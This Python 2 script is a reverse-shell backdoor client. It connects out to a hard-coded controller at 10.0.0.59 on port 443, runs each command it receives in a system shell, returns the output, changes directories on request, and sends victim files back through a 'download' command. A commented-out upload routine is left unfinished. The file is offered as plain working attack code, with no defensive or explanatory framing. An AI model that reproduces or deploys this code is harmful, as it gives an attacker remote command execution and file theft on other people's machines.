import subprocess, os
from socket import *
import webbrowser
import platform
import ctypes
import hashlib


host = "10.0.0.59"
port = 443


def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
# Else Statement : If file not exists . Send : Unable to find out the file .        
    else: 
        s.send('Unable to find out the file')



    
def main():
    while 1:
        s = socket(AF_INET, SOCK_STREAM)
        while 1:
            try:
                s.connect((host,port))
                print "[INFO] Connected"
                break;
            except:
                pass

        while 1:

            try:
                    command =  s.recv(4096)

                    if 'download' in command:
                        
                        grab,path = command.split('*')
                        
                        try:                         
                            transfer(s,path)
                        except Exception,e:
                            s.send ( str(e) )  
                            pass

                        
                    elif ((command != "exit") and ("cd " not in command) and (command != "bb")):
                        comm = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        STDOUT, STDERR = comm.communicate()
                        en_STDERR = bytearray(STDERR)
                        en_STDOUT = bytearray(STDOUT)
                        comm.kill()
                        
                        if (en_STDERR == ""): #dealing with invalid commands
                            if (en_STDOUT != ""): #if the command has an output
                                print en_STDOUT
                                s.send(en_STDOUT)
                            else: # if the command has not output then
                                s.send("[CLIENT] Command Executed")

        
                    elif ("cd " in command): #dealing with the cd command
                            command = command.replace("cd ","")
                            os.chdir(command)
                            s.send(os.getcwd())
                            print "[INFO] Changed dir to %s" % os.getcwd()

                    elif ("bb " in command): #welcome message
                          command = command.replace("cd ","")
			  s.send("SOS")
            except:
                  print "[INFO] Connection Closed"
                  s.close()
                  break
                                  
                
        
         

main()



# [!] TODO work on this 
##def upload (s,path):
##     file_to_write=open(dst,'wb')
##     bits=s.recv(1024)    
##     while True: 
##            if not bits.endswith('DONE'):
##                file_to_write.write(bits)
##            elif bits.endswith('DONE'):
##                bits=bits.replace('DONE','')
##                file_to_write.write(bits)
##                file_to_write.close()
##                break
##            bits=s.recv(1024)

